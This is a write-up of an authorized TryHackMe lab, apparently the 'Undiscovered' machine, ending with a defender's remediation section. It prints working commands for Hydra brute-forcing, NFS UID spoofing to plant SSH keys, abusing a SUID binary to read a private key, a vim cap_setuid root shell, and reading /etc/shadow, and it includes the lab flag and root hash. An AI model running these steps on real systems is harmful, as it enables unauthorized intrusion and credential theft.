# TryHackMe: Undiscovered — Write-up

> **Spoiler warning:** This write-up covers the full attack path in an authorized TryHackMe lab, including user access, root privilege escalation, and the root password hash.

**Difficulty:** Medium  
**Category:** Web Exploitation, NFS Misconfiguration, Lateral Movement & Privilege Escalation  
**Target:** `10.128.130.3` (`undiscovered.thm`)  
**Attacker (Kali):** `192.168.150.170`  
**Tools:** Nmap, ffuf, Hydra, Netcat, NFS, `setpriv`, SSH, Vim, `getcap`

## Overview

The machine exposes an Apache web server and an NFS service. Virtual-host enumeration reveals `deliver.undiscovered.thm`, where an exposed SQL file helps identify a CMS administrator account. After discovering the password with Hydra, we use the CMS file manager to upload a PHP reverse shell and obtain an initial shell as `www-data`.

An NFS export of William's home directory allows access using his numeric UID/GID. We retrieve `user.txt` and add our SSH public key to obtain an interactive shell as `william`. Next, a SUID binary owned by `leonard` exposes his SSH private key, enabling a second SSH login. Finally, a dangerous Linux capability on `vim.basic` allows us to become `root` and read root's password hash from `/etc/shadow`.

**Attack path:**

```text
Nmap → Virtual-host fuzzing → deliver.undiscovered.thm
     → Exposed SQL file → CMS admin password → PHP upload
     → Reverse shell (www-data)
     → NFS AUTH_SYS UID/GID access → user.txt
     → SSH public-key injection → william
     → SUID script reads Leonard's SSH private key → leonard
     → vim.basic CAP_SETUID + Python 3 → root
     → /etc/shadow (root password hash)
```

---

## 1. Reconnaissance & Enumeration

### 1.1. Port scanning

Start with a full TCP port scan, including default scripts and service detection:

```bash
nmap -sC -sV -p- -T4 10.128.130.3
```

Relevant results:

```text
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp    open  http     Apache httpd 2.4.18
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
45329/tcp open  nlockmgr 1-4 (RPC #100021)
```

The important findings are **HTTP (80)** for web enumeration and **NFS (2049)**, which may expose shared directories. SSH is also available on port 22.

Nmap reports that the HTTP service redirects to `http://undiscovered.thm`. Add the machine's hostname to `/etc/hosts` so it resolves to the lab IP:

```text
10.128.130.3 undiscovered.thm
```

### 1.2. Virtual-host enumeration

Next, use `ffuf` to test different `Host` headers. This is **virtual-host fuzzing**, rather than DNS enumeration: every request goes to the same target, but with a different hostname in the HTTP header.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://undiscovered.thm \
  -H "Host: FUZZ.undiscovered.thm" -mc 200
```

The scan returns several candidates, including:

```text
manager      [Status: 200, Size: 4584, Lines: 69]
dashboard    [Status: 200, Size: 4626, Lines: 69]
deliver      [Status: 200, Size: 4650, Lines: 83]
maintenance  [Status: 200, Size: 4668, Lines: 69]
booking      [Status: 200, Size: 4599, Lines: 84]
```

A `200 OK` response alone does not prove a virtual host is unique, so the pages need to be inspected. To visit them in a browser, add the discovered hostnames to `/etc/hosts`, for example:

```text
10.128.130.3 undiscovered.thm manager.undiscovered.thm deliver.undiscovered.thm
```

Browsing `manager.undiscovered.thm` shows a **RiteCMS** page advertising version **2.2.1**.

![RiteCMS page on manager.undiscovered.thm](./assets/Undiscovered/1.png)

The `deliver` virtual host is particularly interesting, so we enumerate its directories next.

### 1.3. Directory fuzzing on `deliver`

```bash
ffuf -u http://deliver.undiscovered.thm/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt -ac
```

Important paths:

```text
cms        [Status: 301]
data       [Status: 301]
files      [Status: 301]
media      [Status: 301]
templates  [Status: 301]
index.php  [Status: 200]
```

The `-ac` option automatically calibrates the scan to help remove false positives. The `/cms` directory suggests a CMS installation, while `/data` deserves closer inspection.

---

## 2. Exposed SQL Files & CMS Credentials

### 2.1. Find the SQL initialization files

Opening the following URL reveals an enabled directory listing:

```text
http://deliver.undiscovered.thm/data/sql/
```

![Directory listing of exposed SQL files](./assets/Undiscovered/2.png)

One of the files is `sqlite.user.initial.sql`. After downloading and opening it, we find a table definition and a default record for the **`admin`** user:

```sql
CREATE TABLE rite_userdata (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name varchar(255) NOT NULL default '',
    type tinyint(4) NOT NULL default '0',
    pw varchar(255) NOT NULL default '',
    last_login int(11) NOT NULL default '0',
    wysiwyg tinyint(4) NOT NULL default '0'
);

INSERT INTO rite_userdata VALUES (1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
```

![SQL initialization file containing the admin record](./assets/Undiscovered/3.png)

This file confirms that the CMS uses an `admin` account in its initial database data. It does **not** establish the current administrator password, so the login still needs to be tested.

### 2.2. Test the CMS login with Hydra

Using the identified username, run Hydra against the CMS login form with the `rockyou.txt` password list:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  deliver.undiscovered.thm http-post-form \
  "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
```

Here, `^USER^` and `^PASS^` are replaced with username/password candidates. The final string is the message Hydra uses to identify a failed login, and `-f` stops after a valid pair is found.

Hydra reports:

```text
[80][http-post-form] host: deliver.undiscovered.thm
login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
```

We can now authenticate to the CMS as `admin`.

---

## 3. Initial Access — PHP Upload to Reverse Shell

### 3.1. Access the file manager

After logging into the CMS, open **Administration → File Manager**. The interface contains an upload option for the `media` directory.

![Authenticated CMS file manager](./assets/Undiscovered/4.png)

![CMS upload form for the media directory](./assets/Undiscovered/5.png)

A PHP file named `pwned.php` is uploaded successfully. It appears in the file manager with the type `text/x-php`.

![Uploaded pwned.php in the file manager](./assets/Undiscovered/6.png)

### 3.2. Locate the uploaded file

The `/media/` directory is publicly browsable:

```text
http://deliver.undiscovered.thm/media/
```

Its directory listing shows the uploaded file:

```text
pwned.php
```

![Public directory listing exposing the uploaded PHP file](./assets/Undiscovered/7.png)

**Finding:** The CMS permits a PHP upload into a web-accessible folder. Because the uploaded PHP file can be requested through the web server, it can be used to execute server-side code.

### 3.3. Receive a reverse shell

On Kali, start a Netcat listener:

```bash
nc -lvnp 1234
```

Request the uploaded PHP file from the browser:

```text
http://deliver.undiscovered.thm/media/pwned.php
```

The reverse-shell PHP code connects back to the listener at `192.168.150.170:1234`. The exact contents of `pwned.php` were not included in the notes for this write-up.

Verify the account in the received shell:

```bash
whoami
```

```text
www-data
```

![Reverse shell received as www-data](./assets/Undiscovered/8.png)

**Initial access obtained:** We have a shell as **`www-data`**, the account used by the web server. This is not root access.

---

## 4. NFS Enumeration — Access to William's Files

### 4.1. Mount William's shared directory

The Nmap scan showed NFS on port 2049. We mount the remote `/home/william` directory onto `/mnt/` on Kali:

```bash
sudo mount -t nfs 10.128.130.3:/home/william /mnt/
```

Verify that it is mounted:

```bash
mount | grep nfs
```

```text
10.128.130.3:/home/william on /mnt type nfs4
(rw,relatime,vers=4.2,proto=tcp,sec=sys,...)
```

The mount succeeds, but trying to list its contents as root fails:

```bash
ls -la /mnt/
```

```text
ls: cannot open directory '/mnt/': Permission denied
```

Inspecting the local mount point shows:

```bash
stat /mnt/
```

```text
Access: (0750/drwxr-x---)
Uid: (65534/ nobody)   Gid: (65534/ nogroup)
```

The `750` permissions allow access only to the owner and group. Although the mount uses `rw`, that does not override directory permissions. The `nobody` display may be related to NFS identity mapping or root squashing; it does not identify the cause on its own.

### 4.2. Identify William's numeric UID and GID

From the **`www-data` shell on the target**, check William's account and home-directory ownership:

```bash
id william
ls -ldn /home/william
```

```text
uid=3003(william) gid=3003(william) groups=3003(william)
drwxr-x--- 4 3003 3003 4096 Sep 10 2020 /home/william
```

William owns the directory, and his **UID and GID are both 3003**.

### 4.3. Access the NFS share with UID 3003

On **Kali**, run `ls` with the same numerical identity:

```bash
sudo setpriv --reuid=3003 --regid=3003 --clear-groups ls -la /mnt/
```

This time, the directory listing succeeds:

```text
drwxr-x---  4 nobody nogroup 4096 Sep  9  2020 .
-rwxr-xr-x  1 root   root     128 Sep  4  2020 admin.sh
-rwsrwsr-x  1 nobody nogroup 8776 Sep  4  2020 script
-rw-r-----  1 root   nogroup   38 Sep  9  2020 user.txt
```

**Why it works:** The NFS mount uses `sec=sys` (`AUTH_SYS`), which relies on numeric user and group identities supplied in client requests. In this lab, making the request with UID/GID `3003` provides access that was denied to our local root process. It does **not** turn our Kali shell into William on the target machine.

The `script` binary also has SUID/SGID bits set. We will investigate it after establishing an SSH session as William.

### 4.4. Read the user flag

Run `cat` with the same UID/GID:

```bash
sudo setpriv --reuid=3003 --regid=3003 --clear-groups cat /mnt/user.txt
```

```text
THM{8d7b7299cccd1796a61915901d0e091c}
```

**User flag obtained!**

---

## 5. NFS Misconfiguration — SSH Access as William

### 5.1. Add an SSH public key through NFS

We can read William's files over NFS by using UID/GID `3003`. The share is mounted read-write, so we test whether we can also create files in his home directory.

First, generate an SSH key pair **on Kali**:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/william_thm -N ''
```

Next, create William's `.ssh` directory using his numeric identity:

```bash
sudo setpriv --reuid=3003 --regid=3003 --clear-groups mkdir -p /mnt/.ssh
sudo setpriv --reuid=3003 --regid=3003 --clear-groups chmod 700 /mnt/.ssh
```

Append the public key to William's `authorized_keys`:

```bash
sudo setpriv --reuid=3003 --regid=3003 --clear-groups \
  tee -a /mnt/.ssh/authorized_keys < ~/.ssh/william_thm.pub > /dev/null

sudo setpriv --reuid=3003 --regid=3003 --clear-groups \
  chmod 600 /mnt/.ssh/authorized_keys
```

**Why it works:** The NFS server accepts file operations using the client-supplied UID/GID under `sec=sys`. Because these requests use William's UID, we can modify files in his home directory. SSH uses `~/.ssh/authorized_keys` to decide which public keys may authenticate to the account.

### 5.2. Log in as William

From Kali, connect using the newly generated private key:

```bash
ssh -i ~/.ssh/william_thm william@10.128.130.3
```

The login succeeds. We now have a proper SSH session as **`william`** rather than only access to his files over NFS.

```bash
whoami
```

```text
william
```

---

## 6. From William to Leonard — SUID Arbitrary File Read

### 6.1. Inspect William's home directory

```bash
ls -l
```

```text
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rwsrwsr-x 1 leonard leonard 8776 Sep  4  2020 script
-rw-r----- 1 root    william   38 Sep 10  2020 user.txt
```

The `admin.sh` file only prints a message and exits:

```bash
cat admin.sh
```

```sh
#!/bin/sh

echo "[i] Start Admin Area!"
echo "[i] Make sure to keep this script safe from anyone else!"

exit 0
```

The interesting file is **`script`**: it belongs to `leonard` and has both the SUID and SGID bits set (`-rwsrwsr-x`). When William executes this binary, it can perform operations with Leonard's effective user and group privileges.

### 6.2. Test the SUID binary

Passing a filename as an argument gives us a useful error:

```bash
./script hello
```

```text
/bin/cat: /home/leonard/hello: No such file or directory
```

This shows that the program tries to read a file under `/home/leonard/` using `/bin/cat`. We can influence which file it reads through the argument.

Try Leonard's private SSH key:

```bash
./script .ssh/id_rsa
```

The binary prints a private key:

```text
-----BEGIN RSA PRIVATE KEY-----
[private key contents omitted]
-----END RSA PRIVATE KEY-----
```

**Finding:** This SUID program exposes a sensitive file belonging to `leonard`. William normally cannot read Leonard's private SSH key directly, but the SUID binary can read it with Leonard's privileges.

### 6.3. Authenticate as Leonard

Save the extracted private key to a local file on Kali. One way to capture it without copying the full output manually is:

```bash
ssh -T -i ~/.ssh/william_thm william@10.128.130.3 \
  '/home/william/script .ssh/id_rsa' > leonard_id_rsa

chmod 600 leonard_id_rsa
```

Then connect:

```bash
ssh -i leonard_id_rsa leonard@10.128.130.3
```

The SSH login succeeds, giving us a shell as **`leonard`**.

> The full private key is deliberately omitted from this public write-up. Exposing credentials is the vulnerability, not a reason to republish them.

---

## 7. From Leonard to Root — Vim Linux Capability Abuse

### 7.1. Investigate Vim history

In Leonard's home directory, we find a `.viminfo` file. This file stores information from previous Vim sessions, including command history:

```bash
cat ~/.viminfo
```

Some entries are particularly interesting:

```text
:py
:exec python -c 'import os;os.setuid(0);os.system("id")'
:py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

The history suggests an attempt to use Vim's embedded Python interpreter to set the user ID to `0` (root) and launch a shell. However, an ordinary Vim process cannot become root this way. We need to find out what privileges the executable has.

### 7.2. Check SUID files and capabilities

A search for SUID binaries does not identify Vim:

```bash
find / -type f -perm -4000 2>/dev/null
```

Instead, check **Linux file capabilities**:

```bash
getcap -r / 2>/dev/null
```

Relevant output:

```text
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```

The last line is the vulnerability:

```text
/usr/bin/vim.basic = cap_setuid+ep
```

`CAP_SETUID` allows the process to change user IDs, including to UID `0`. The `e` and `p` flags indicate that the capability is effective and permitted. This is different from a traditional SUID-root binary.

### 7.3. Check Python support in Vim

```bash
vim.basic --version | grep python
```

```text
+cryptv          +linebreak       -python          +vreplace
+cscope          +lispindent      +python3         +wildignore
```

Vim supports **Python 3** (`+python3`) but not Python 2 (`-python`). Therefore `:py` raises `E319: Sorry, the command is not available in this version`; we must use `:py3`.

### 7.4. Spawn a root shell

Launch Vim as Leonard:

```bash
/usr/bin/vim.basic
```

Inside Vim, press `Esc`, enter the following command, and press `Enter`:

```vim
:py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec /bin/sh -p")
```

The Python code uses Vim's `CAP_SETUID` capability to switch to UID `0`, then replaces the process with a shell. The `reset` command helps restore the terminal when leaving Vim.

Verify the result:

```bash
whoami
```

```text
root
```

**Root access obtained!**

---

## 8. Root Password Hash

With root privileges, we can read `/etc/shadow`, the protected file that stores password hashes for local accounts.

```bash
grep '^root:' /etc/shadow
```

```text
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
```

The second colon-separated field is root's password hash:

```text
$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0
```

- `$6$` indicates **SHA-512 crypt**, a password-hashing scheme.
- `1VMGCoHv` is the salt.
- The remaining string is the hashed password value.

This is **not** the plaintext root password. We have retrieved the hash; cracking it was not part of the documented steps.

---

## 9. The Defender's View (Remediation)

The machine's compromise relied on several weaknesses that combined into a complete attack chain:

1. **Protect CMS accounts:** Use strong, unique passwords, rate-limiting, and, where possible, multi-factor authentication. The administrator password was found with a dictionary attack.
2. **Restrict uploads and code execution:** Do not allow arbitrary PHP files to be uploaded and executed in a public media directory. Validate uploads and disable script execution in upload locations.
3. **Remove exposed application data:** Prevent directory listings and public access to SQL initialization files such as those in `/data/sql/`.
4. **Secure NFS:** Do not export users' home directories unnecessarily. Restrict trusted clients and avoid relying solely on client-supplied UID/GID authentication (`sec=sys`) for sensitive writable shares. `root_squash` alone does not stop someone using an owner's non-root UID.
5. **Protect SSH credentials:** Keep private keys inaccessible to other users, and prevent ordinary users from modifying another account's `authorized_keys` file through exposed shares.
6. **Remove the unsafe SUID/SGID bits:** The `script` binary should not run as Leonard while accepting unrestricted filenames. Remove unnecessary elevated permissions and allow only explicitly approved file operations.
7. **Remove the dangerous Vim capability:** The `cap_setuid` capability is unnecessary for a text editor. Remove it using `sudo setcap -r /usr/bin/vim.basic` and audit other file capabilities.

---

## 10. Results & Conclusion

| Objective | Result |
|---|---|
| Reconnaissance | HTTP, SSH, RPC and NFS identified |
| Web enumeration | Multiple virtual hosts; exposed CMS data |
| Initial access | PHP upload and reverse shell as `www-data` |
| User flag | `THM{8d7b7299cccd1796a61915901d0e091c}` |
| Lateral movement 1 | NFS UID/GID spoofing and SSH access as `william` |
| Lateral movement 2 | SUID file read and SSH access as `leonard` |
| Privilege escalation | `vim.basic` with `CAP_SETUID` → `root` |
| Final objective | Root's SHA-512 crypt password hash retrieved |

**Conclusion:** The machine demonstrates how seemingly separate configuration problems can be chained: weak CMS credentials, executable uploads, insecure NFS trust, a SUID file-reading utility, and an unnecessary Linux capability. Each step gave access to the next account until root privileges were obtained.

> The provided evidence confirms root access and retrieval of the root password hash. No separate `root.txt` flag was supplied for this write-up, so none is claimed here.
